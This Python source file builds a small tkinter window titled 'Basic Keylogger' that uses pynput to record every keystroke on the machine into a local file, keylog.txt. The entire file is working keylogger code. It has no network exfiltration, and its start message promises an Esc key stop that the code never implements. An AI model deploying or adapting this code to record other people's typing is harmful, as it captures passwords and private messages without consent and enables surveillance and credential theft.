import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

# Global variable to keep track of keystrokes
keys = []

# Log keys into a file
def write_to_file(key):
    # Append key to the global key list
    keys.append(key)
    with open("keylog.txt", "a") as f:
        # Remove 'Key.' prefix from special keys (like space, enter)
        k = str(key).replace("'", "")
        if "Key" in k:
            f.write(f"[{k}]")
        else:
            f.write(k)

# Start keylogger
def start_keylogger():
    messagebox.showinfo("Keylogger", "Keylogger started. Press 'Esc' to stop.")
    listener = keyboard.Listener(on_press=write_to_file)
    listener.start()

# Function to stop keylogger
def stop_keylogger():
    messagebox.showinfo("Keylogger", "Keylogger stopped.")
    root.quit()

# Create the GUI window
root = tk.Tk()
root.title("Basic Keylogger")
root.geometry("300x200")

# Label and buttons
label = tk.Label(root, text="Basic Keylogger", font=("Helvetica", 14))
label.pack(pady=20)

start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

# Run the GUI loop
root.mainloop()
